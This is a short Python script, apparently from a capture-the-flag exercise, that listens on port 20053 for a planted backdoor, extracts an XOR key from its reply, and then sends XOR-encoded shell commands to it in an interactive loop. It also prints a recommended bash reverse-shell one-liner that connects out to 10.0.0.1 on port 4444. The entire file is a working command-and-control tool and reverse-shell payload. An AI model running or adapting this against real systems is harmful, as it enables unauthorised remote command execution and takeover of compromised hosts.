#!/usr/bin/python3

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def xor(command, key):
    data = ''
    for char in command:
        data += chr(ord(char) ^ ord(key))
    return data

def decode_key(response):
    response = bytes.fromhex(response.split('|')[1]).decode('utf-8').split(':')[1] 
    key_hex = bytes.fromhex(response).decode('utf-8').split('_')[2]
    return key_hex

print("\nSend: 746f6279YOURIP:00")
print("Example: 746f627910.10.10.85:00\n")

try:
    s.bind(('0.0.0.0',20053))
    s.listen(10)
    conn , addr = s.accept()
    response = conn.recv(1024)
    key = decode_key(response.decode())

    print("Established connection with {}".format(addr))
    print("KEY : {}\n".format(key))
    print("Reverse Shell recommended: bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\n")
    data_command = input("~> ")

    while data_command != 'exit':
        data_command = xor(data_command,key)    
        conn.send(data_command.encode())
        res = conn.recv(1024)
        res = bytes.fromhex(res.decode('utf-8').split('|')[1]).decode('utf-8')
        cmd = xor(res,key)
        print('\n' + cmd)
        data_command = input("~> ")

    conn.close()

except:
    print("Connection error")
    
